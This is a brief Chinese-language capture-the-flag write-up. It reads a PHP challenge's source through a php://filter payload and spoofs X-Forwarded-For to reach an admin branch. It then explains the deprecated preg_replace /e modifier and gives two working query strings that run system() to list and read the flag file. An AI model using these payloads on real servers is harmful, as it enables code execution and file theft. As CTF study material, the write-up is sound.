php://filter/read=convert.base64-encode/resource=index.php

index.php:****

if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
echo "<br >Welcome My Admin ! <br >";

$pattern = $_GET[pat];
$replacement = $_GET[rep];
$subject = $_GET[sub];

if (isset($pattern) && isset($replacement) && isset($subject)) {
    preg_replace($pattern, $replacement, $subject);
}else{
    die();
}
}

preg_replace($pattern, $replacement, $subject)

  • 作用：搜索subject中匹配pattern的部分， 以replacement的内容进行替换。
  • $pattern: 要搜索的模式，可以是字符串或一个字符串数组。
  • $replacement: 用于替换的字符串或字符串数组。
  • $subject: 要搜索替换的目标字符串或字符串数组。

subject中有要搜索的pattern的内容，同时将在replacement前加上/e，触发/e漏洞，就可以执行replacement中的正确的php代码

?pat=/1/e&rep=system('cd%20s3chahahaDir/flag%26%26%20ls')&sub=1

?pat=/1/e&rep=system("cat%20s3chahahaDir/flag/flag.php")&sub=1
